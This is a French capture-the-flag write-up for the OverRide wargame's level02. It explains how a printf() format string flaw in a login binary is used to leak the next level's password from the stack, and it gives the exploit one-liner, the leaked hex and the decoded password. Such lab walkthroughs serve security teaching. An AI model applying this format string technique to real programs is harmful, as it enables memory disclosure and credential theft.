# Level 02

### Protections

![](Ressources/protections.png)

### Analyse

Le programme demande un **username** et un **password** a l'aide de `fgets()`.

Le programme ouvre le fichier `/home/users/level03/.pass` que l'on convoite tant. En effet, si on entre un certain mot de passe, le programme nous montrera le contenu du `.pass`.

Seulement, c'est un `strncmp()` qui fait la verification, et il compare notre entree au contenu du `.pass`. *Donc pour avoir le mot de passe de level03 il nous faut le mot de passe de level03* 🥲

Le programme parrait protege a une attaque de type Buffer Overflow.

Mais si on l'examine de plus pres, il y a un `printf()` qui prend en parametre notre entree. On a rien a perdre alors pourquoi ne pas tenter un **Format String Injection** ?

> level02@OverRide:~$ ./level02
> ===== [ Secure Access System v1.0 ] =====
> /***************************************
> | You must login to access this system. |
> \**************************************/
> --[ Username: %x%x%x%x
> --[ Password: .
>
> ffffe3d002e2a2a2a2a does not have access!

Interessant, on sait maintenant qu'**on peut lire et ecrire dans la memoire**.



Format String Injection Offset: 28

(python -c 'print "%22$06lx" + "%23$06lx" + "%24$06lx" + "%25$06lx" + "%26$06lx"') | ./level02

756e50523437684845414a3561733951377a7143574e6758354a35686e47587348336750664b394d

75 6e 50 52 34 37 68 48
45 41 4a 35 61 73 39 51
37 7a 71 43 57 4e 67 58
35 4a 35 68 6e 47 58 73
48 33 67 50 66 4b 39 4d

48 68 37 34 52 50 6e 75
51 39 73 61 35 4a 41 45
58 67 4e 57 43 71 7a 37
73 58 47 6e 68 35 4a 35
4d 39 4b 66 50 67 33 48

Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
